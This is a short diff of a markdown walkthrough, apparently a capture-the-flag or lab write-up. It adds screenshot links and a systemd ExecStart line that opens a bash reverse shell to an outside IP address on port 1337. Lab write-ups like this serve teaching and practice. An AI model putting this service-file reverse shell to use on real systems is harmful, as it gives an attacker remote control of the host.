@@ -289,12 +289,27 @@ drac@ide:/srv/ftp$
 
 ![image](https://github.com/user-attachments/assets/410b4097-b163-4ae9-98e4-453b54e57504)
 
+<br>
+
+![image](https://github.com/user-attachments/assets/2fa73f06-da34-4e11-a8ec-b80873d7ca90)
+
+
 
 <br>
 
 ![image](https://github.com/user-attachments/assets/64a1d55d-e6e1-4f8a-a716-774d7b57f547)
 
 <br>
+
+```bash
+
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.194.200/1337 0>&1' 
+```
+
+![image](https://github.com/user-attachments/assets/59fc51d1-7268-43a3-875b-efbc87971329)
+
+<br>
+
 
 
 
